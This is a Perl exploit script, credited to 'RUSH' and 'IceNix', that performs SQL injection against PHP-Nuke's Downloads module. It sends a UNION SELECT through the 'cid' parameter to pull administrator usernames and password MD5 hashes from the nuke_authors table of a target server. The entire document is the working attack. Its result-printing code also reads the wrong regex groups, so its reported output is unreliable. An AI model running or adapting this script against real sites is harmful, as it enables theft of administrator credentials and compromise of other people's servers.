#!/usr/bin/perl -w
use IO::Socket;


if (@ARGV < 3)
{
print "################################################################\n";
print " nuke-xploit.pl - PHP-NUKE 'CiD' sql injection exploit\n";
print " Origional by RUSH / tweaked by IceNix\n";
print " -----------------------------------------------------\n";
print "################################################################\n";
print " Usage:\n";
print " nuke-xploit.pl <host> </folder/> <aid>\n";
print "\n";
print " <host> - webserver you want to r00t\n";
print " </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\n";
print " <aid> - user aid , nick ( admin , god , root , whateva )\n";
print " ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print " REQUIREMENTS:                                                 \n";
print " (*) Only works on MySQL Version > 4.0\n";
print " (*) You need to know the Admins User-Name\n";
print " (*) Please dont be an abuser\n";
print "##################################################################";
exit();
}

$server = $ARGV[0];
$folder = $ARGV[1];
$aid = $ARGV[2];

print "\n";
print "server : $server\n";
print "folder : $folder\n";
print "aid : $aid\n";
print "\n";
$success = 0;
$path_download = "modules.php?name=Downloads&d_op=viewdownload&cid=2%20UNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--";
$GET = $folder . $path_download;
print "[~] Prepare to connect...\n";
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || die "[-] connect failed\n";
print "[+] connected [exists]\n";
print "[~] prepare to send data...[sending exploit]\n";
print $socket "GET $GET HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Http-Referer: http://microsoft.com\n";
print $socket "User-Agent: Internet Explorer 6.0\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
print "[+] success...[wo0t .. exploit sent]\n";
print "[~] wait for reply...[cross your fingers]\n";
while ($answer = <$socket>)
{
#print "$answer";
if ($answer=~/(&cid=)(\w)(\"><b>)($aid)(<\/b><\/a><\/font>)(.{0,20})(<font class=\"content\">)(.{32})(<\/font>)/)
{
$success = 1;
print "[+] wo0t..Pay Tribute to IceNix\n";
print "[+] USER: $1 \n[+] MD5 HASH: $6\n";
}
}
if ($success == 0) { print "[-] the exploit failed...possible reasons: [Not MySQL Version 4.0]\n"; }

